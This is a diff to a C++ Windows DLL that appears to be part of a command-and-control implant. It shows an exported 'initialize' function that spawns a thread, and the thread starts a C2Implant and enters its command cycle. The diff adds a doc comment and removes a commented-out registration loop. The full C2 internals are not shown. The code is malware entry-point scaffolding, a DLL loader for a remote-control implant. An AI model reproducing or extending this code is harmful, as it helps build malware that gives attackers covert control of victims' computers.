@@ -2,21 +2,17 @@
 #include "core/c2.h"
 #include "_debug/debug.h"
 #include "defense/winapi.h"
+
+/**
+ * @brief DLL entrypoint into the program
+ * 
+ * @return DWORD
+ */
 DWORD WINAPI ImplantThread(LPVOID)
 {
     DEBUG_LOG("[ImplantThread] Thread started. Initializing C2Implant...");
     C2Implant c2implant;
     c2implant.init();
-    //C2Implant implant;
-
-    //while (1) {
-    //    //on success, break to implant.cycle()
-    //    if (c2implant.register_implant() == 1) {
-    //        break;
-    //    }
-    //    //get rid of me, just a debug to prevent a register loop
-    //    Sleep(5000);
-    //}
 
     DEBUG_LOG("[ImplantThread] Entering main C2 cycle");
     c2implant.cycle();
@@ -29,6 +25,7 @@ extern "C" __declspec(dllexport) void __cdecl initialize() {
     DEBUG_LOG("[DLL Export::initialize] Exported function 'initialize' called. Spawning ImplantThread...");
     WinApi::CreateThread(nullptr, 0, ImplantThread, nullptr, 0, nullptr);
 }
+
 
 BOOL APIENTRY DllMain(HMODULE hModule,
     DWORD  ul_reason_for_call,
